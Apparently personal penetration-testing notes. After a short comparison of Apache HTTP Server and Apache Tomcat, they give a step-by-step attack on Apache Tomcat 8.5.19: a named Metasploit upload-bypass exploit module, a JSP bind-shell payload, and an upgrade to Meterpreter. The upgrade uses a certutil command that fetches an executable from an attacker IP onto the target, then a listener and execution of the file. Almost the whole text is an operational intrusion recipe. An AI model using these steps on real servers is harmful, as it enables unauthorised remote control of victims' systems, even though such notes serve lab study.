# **Difference between Apache & Apache Tomcat:**

#### The standard <mark style="background: #00CDFF82;">Apache</mark> HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP at <mark style="background: #62BE6A;">Port 80</mark>.

#### The <mark style="background: #ED7506;">Apache Tomcat</mark> web server is primarily used to host dynamic websites or web applications developed in Java at <mark style="background: #ED7506;">Port 8080</mark>.



---
# **MSF Module to Exploit "Apache Tomcat 8.5.19"**

	use exploit/multi/http/tomcat_jsp_upload_bypass

Then choose this payload

	set payload java/jsp_shell_bind_tcp


If the target is windows choose the shell type:

	set SHELL cmd


#### This exploit gives a basic Java shell... To upgrade to a meterpreter session Check [[msfvenom⚕️]]:

1. Create a Meterpreter Payload using ur local IP and Port.
2. Serve this payload using a python web server.
3. download this payload to the target <mark style="background: #e74c3c;">in the directory where you get the session on</mark> using that basic shell and using this utility in windows:

		certutil -urlcache -f http://10.10.45.11/meterpreter.exe outputfile.exe

4. Then setup a listener using `multi/handler` module in MSF
5. Then Execute the file we download. If windows like this: `.\outputfile.exe`   # Make sure the back slash is for Windows and forward slash for Linux

